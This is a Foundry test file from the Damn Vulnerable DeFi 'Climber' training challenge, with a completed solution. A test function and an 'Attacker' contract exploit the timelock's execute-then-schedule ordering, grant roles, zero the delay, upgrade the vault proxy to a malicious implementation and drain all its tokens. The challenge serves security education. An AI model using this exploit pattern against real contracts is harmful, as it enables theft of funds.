// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";


import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";



contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    Attacker attacker;
    function test_climber() public checkSolvedByPlayer {

        bytes32 mySalt = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;
        address[] memory target = new address[](3);
        target[0] = payable(address(timelock));
        target[1] = payable(address(timelock));
        target[2] = (address(vault));
        uint256[] memory value = new uint256[](3);
        value[0] = 0;
        value[1] = 0;
        value[2] = 0;

        //deploy the scammer contract
        attacker = new Attacker();
        //constructing the execute function arguments
        bytes[] memory payload = new bytes[](3);
        //give proposer role to scam contract
        payload[0] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,address(vault));
        //updateDelay
        payload[1] = abi.encodeWithSignature("updateDelay(uint64)",0);
        //call updateAndCall
        bytes memory payload_3_1 = abi.encodeWithSignature("propose(address,address,address)",address(timelock),(address(vault)),address(attacker));
        payload[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(attacker),payload_3_1);
        timelock.execute(target,value,payload,mySalt);
        vault.withdraw(address(token),recovery,VAULT_TOKEN_BALANCE);

        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function withdraw(address token, address recipient, uint256 amount) external {
        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    function propose(address A,address B,address C) public {

        address[] memory target = new address[](3);
        target[0] = payable(A);
        target[1] = payable(A);
        target[2] = (B);

        uint256[] memory value = new uint256[](3);
        value[0] = 0;
        value[1] = 0;
        value[2] = 0;

        bytes[] memory payload = new bytes[](3);
        payload[0] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,B);
        payload[1] = abi.encodeWithSignature("updateDelay(uint64)",0);
        bytes memory payload_last = abi.encodeWithSignature("propose(address,address,address)",A,B,C);
        payload[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",C,payload_last);

        bytes memory finalPayload = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)",target,value,payload,0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);
        target[0].call(finalPayload);
    }
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {
        // For testing, owner authorization is sufficient
    }
}
